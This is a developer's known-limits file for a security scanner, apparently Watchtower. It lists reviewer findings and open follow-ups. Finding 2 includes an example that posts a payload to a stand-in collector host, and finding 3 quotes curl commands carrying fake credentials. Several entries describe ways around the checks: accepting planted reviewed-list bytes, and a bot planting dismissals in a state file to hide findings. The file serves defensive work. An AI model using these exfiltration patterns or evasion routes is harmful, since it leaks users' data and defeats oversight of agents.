# Known limits

Open findings that dev carries knowingly. Each one is **must-fix before any release**.

## Batch 5 (merged to dev Oct 19, 2026: #15 and #16)

Ken approved merging #15 and #16 into dev on Oct 19, 2026 with these 7 Codex highs open. Forge fixes them after the freeze, before release. They're worded as Codex wrote them in its final checks after fix round 3: #15 at 62ccd0e and #16 at c3b0257. File links point at the code as merged.

**Status: open, must-fix before any release.**

### From #15 (batch 5 PR A: platform notes, reviewed list, #11 follow-ups)

1. **high — [text.py:779](../watchtower/wt_parts/text.py): “Maybe” still permits realistic destination downgrades.**

   `requests.post(os.environ.get('HOOK', '<webhook>'), json=payload)` remains T018/**Install with changes** when `HOOK` actually selects `https://collector.example`. A sibling JSON configuration produces the same result; scanning that JSON separately raises no finding. Unknown-object `getattr`, `setdefault`, `pop`, environment-backed collections and reassigned destination variables also retain T018.

   The assertion conflict is real, but the two tests have different premises. The explicitly empty `config = {}` example can safely retain T018. The broader [safe-default assertions](../tests/test_batch5_codex_r2.py) include externally overridden values and codify this gap. The earlier blanket “fixed” assessment was too broad. Preserving those assertions does not establish safety.

   **Fix:** require evidence that the webhook is the selected destination. Preserve the proven empty-map case; correct assertions that treat unknown runtime defaults as established destinations.

2. **high — [text.py:748](../watchtower/wt_parts/text.py): Receiver naming introduces a new lookup bypass.**

   This complete example selects the collector:

   ```python
   cfg_client = {}
   url = cfg_client.get("<webhook>", "https://collector.example")
   requests.post(url, json=payload)
   ```

   It changes from T005 on `77dedd1` to T018/**Install with changes** on HEAD, despite the explicit collector URL. The `client` suffix makes the lookup appear to be HTTP GET. Conversely, `s = requests.Session(); s.get("<webhook>")` changes from T018 to critical T005.

   **Fix:** establish receiver identity from bindings/API use; a variable-name suffix must not authorize a destination downgrade.

3. **Fixed in batch 6 PR2 (fix/batch6b, "Fake keys and dismissals"), together with #15 medium 6 (masking idempotence; MASK_VERSION 8).** Replays: `tests/test_batch6_mask.py`. **high — [mask.py:689](../watchtower/wt_parts/mask.py): Additional credential flags still leak.**

   With `\<newline>` representing a continued shell word, these retain `FAKEz` through **`mask_secrets`, finding evidence and `save_approved()`**:

   - `curl --coo\<newline>kie 'sid=FAKEz' https://x.example`
   - `curl -\<newline>b 'sid=FAKEz' https://x.example`
   - `curl --oauth2-bea\<newline>rer FAKEz https://x.example`

   These are remaining coverage gaps, not newly introduced leaks. Version-6 copies containing them are migrated to **version 7 while retaining the secret**.

   **Fix:** recognize normalized curl cookie and OAuth bearer options, including their short/attached forms, and mask their credential values.

4. **high — [scanners.py:272](../watchtower/wt_parts/scanners.py): Missing mutable installation metadata still disables release checks.**

   A copy moved outside the default home, under a name other than `app`, without the adjacent commit record returns `installed_root() == None`, skips self-check and accepts planted reviewed-list bytes. A custom-home rename plus removal of its commit record does likewise. Changing `WATCHTOWER_HOME` does not restore protection.

   The “no `.git`” justification does not match the predicate: installation classification does not inspect `.git`. The newly added [checkout guard](../tests/test_batch5_codex_r3.py) explicitly preserves this bypass.

   **Fix:** keep reviewed-list, normalization and scanner trust bound to verified release provenance regardless of directory layout or missing state. Missing Bot-writable metadata must not grant unchecked trust.

### From #16 (batch 5 PR B: access map, threat brief)

5. **High — [collect.py:10](../watchtower/wt_parts/collect.py), [access.py:344](../watchtower/wt_parts/access.py), [access.py:460](../watchtower/wt_parts/access.py): Permission failures can still mean “absent.”**

   `isdir()`, `isfile()` and `lexists()` suppress permission errors into false results. These checks occur before the new error tracking or hardened opens. An unstatable scan root produces neither an error nor a skip; an inaccessible browser ancestor produces `(None, True)`; an inaccessible directory lookup produces `([], True)`.

   An in-memory `access_map_now()` replay with denied metadata lookups consequently returned no incompleteness, browser/MCP/CLI/plugin absence statements, `scheduled_jobs: 0`, and **“Watchtower found no Gmail connector, sign-in or webhook here.”** Ordinary errors *after* opening/listing a directory are handled correctly.

   **Fix:** distinguish confirmed absence from failed lookup. Propagate permission and other lookup errors through root collection, browser/seed checks, CLI discovery and scheduled-directory coverage.

6. **Fixed in batch 6 PR2 (fix/batch6b, "Fake keys and dismissals").** Replays: `tests/test_batch6_connectors.py`. **High — [access.py:136](../watchtower/wt_parts/access.py): Saved connector lists bypass malformed-answer validation.**

   A fresh reply with `connectors: [{"name":"Gmail"}]` becomes incomplete. The same value in saved `rollcall_findings.json` passes through `_ax_said()` as an empty, complete connector list.

   The full saved-record reader reproduced **“Golf: no connectors,”** `bot_connectors_complete: true`, and the Gmail absence sentence. `[123]` behaves similarly. A saved scalar `"Gmail"` instead becomes unknown but loses its canonical positive observation.

   **Fix:** apply the same normalization and validation on fresh replies, carried-over records and saved-file reads. Non-string list members must establish incompleteness; supported scalar strings should retain canonical labels.

7. **High — [golden_split.py:803](../tests/golden_split.py), [golden_split.py:996](../tests/golden_split.py): Requirements remain per scenario, not per run/output key.**

   Using the shipped item-a entries, I supplied one healthy audit and a second audit in the same scenario with its entire access addition omitted. The result remained **zero unexpected lines and zero unmet requirements**. The scenario sequences actually contain repeated audits.

   **Fix:** require each applicable `(scenario, output key/run)` independently, including outputs whose omission leaves them identical to baseline.

## Batch 6 PR2 (fix/batch6b, "Fake keys and dismissals"): follow-ups

KL3 and KL6 above are fixed in this PR; KL1, KL2, KL4, KL5 and KL7 are PR1's and PR3's. B5 removed the name-based secret skips Ken named (gitleaks' `tests/`, `fixtures/`, `testdata/`, `*.test.*` path skips, the whole-line `$VAR`/placeholder rule, and `fixplan.py`'s FIXTURE_PATH). These name- or line-based rules are still in place and are logged here to be replaced by content checks in a later batch (**status: open follow-ups, not release blockers on their own**):

- **gitleaks path allowlist** ([secrets_pkgs.py](../watchtower/wt_parts/secrets_pkgs.py), `GITLEAKS_CONFIG`): package stores and caches (`node_modules`, `.cache`, `site-packages`, `go/pkg`, …), browser profiles, the named credential files, Watchtower's own folders, lockfiles and `marketplace.json`, and every `.h` file are never read by gitleaks.
- **gitleaks whole-line rules**: a line with `x-amz-credential=` / `X-Amz-Signature=` or `?AWSAccessKeyId=` / `Signature=` / `Expires=` hides every other hit on that line.
- **`in_toolchain_tree`** ([secrets_pkgs.py](../watchtower/wt_parts/secrets_pkgs.py)): gitleaks hits under Go, pnpm, rustup and cargo trees are counted, not listed.
- **`SAMPLE_SKILL_PATH`** ([collect.py](../watchtower/wt_parts/collect.py), used by [scope.py](../watchtower/wt_parts/scope.py)): a skill under a `tests/`, `fixtures/`, `examples/`, `docs/` or `references/` segment outside the loadable locations isn't scored as installed (keys there are still reported: SECRET_RULES count wherever they sit).

Limits of the new behavior, kept knowingly:

- **B5:** a gitleaks hit is judged only when its secret is found again in exactly one place of the lines gitleaks named (and, when gitleaks gives it, with gitleaks' Entropy); anything else is kept as before. A Match that is the whole secret (`REDACTED` with no text around it) is judged only with gitleaks' Entropy. A key block with no END line within 16 KB is treated as a real key; a gitleaks hit is read as a key block only when it is gitleaks' `private-key` rule, so a BEGIN line beside another hit's secret never judges that secret. `sk_test_`-style keys and any value with a placeholder word (`test`, `example`, `1234`, …) count as examples, as `looks_real_secret` already did for WT-T011.
- **B6:** a dismissal held across an unrelated edit is read from `state/dismissed.jsonl`, which a Bot can write: a Bot that reads a finding's key and `ev256` from `last_findings.json` can plant one for a non-critical finding that only the change backs up (the change's own WT-I001 still counts). Lines inserted above the dismissed match shift its `where`, so its key changes and it comes back once.
- **KL3 test conflict:** `tests/test_batch5_codex_r3.py::ShortAfterJoins::test_in_an_approved_copy` asserts `masked == 7`; MASK_VERSION 8 makes it fail. It isn't on the plan's list of assertions this PR may change, so it is left for Ken's decision.
